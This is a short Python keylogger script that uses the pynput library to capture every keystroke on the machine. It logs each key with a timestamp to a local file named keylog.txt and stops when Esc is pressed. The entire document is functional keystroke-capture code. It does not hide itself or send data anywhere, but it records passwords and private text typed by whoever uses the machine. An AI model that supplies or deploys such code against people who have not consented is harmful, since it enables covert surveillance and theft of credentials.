from pynput import keyboard
import logging

# Set up the logging configuration
logging.basicConfig(
    filename="keylog.txt",  # Log file to save keystrokes
    level=logging.DEBUG,  # Log all events (including DEBUG)
    format="%(asctime)s: %(message)s"  # Timestamp for each keystroke
)

# Function to log pressed keys
def on_press(key):
    try:
        # Record the key that was pressed
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        # Handle special keys like space, enter, etc.
        logging.info(f"Special key pressed: {key}")

# Function to handle key release (optional)
def on_release(key):
    # Stop listener when 'esc' is pressed
    if key == keyboard.Key.esc:
        return False

# Start listening to keyboard input
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
